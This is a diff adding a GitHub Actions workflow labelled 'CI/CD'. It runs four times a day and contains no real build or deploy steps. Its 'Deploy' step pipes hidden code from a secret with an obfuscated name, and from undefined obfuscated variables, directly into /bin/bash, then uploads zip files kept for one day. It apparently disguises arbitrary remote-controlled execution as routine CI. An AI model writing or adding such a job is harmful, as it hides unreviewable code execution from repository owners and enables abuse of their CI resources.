@@ -1,0 +1,28 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          c44030: ${{ secrets.c44030 }}
+        run: |
+          printf '%s' "$c44030" | jq -r .guhgl34571 | /bin/bash
+          echo $khxmq33 | jq -r .xo219 | /bin/bash
+          echo $x734 | jq -r .odur1 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1CcqrSim
+          path: "*.zip"
+          retention-days: 1
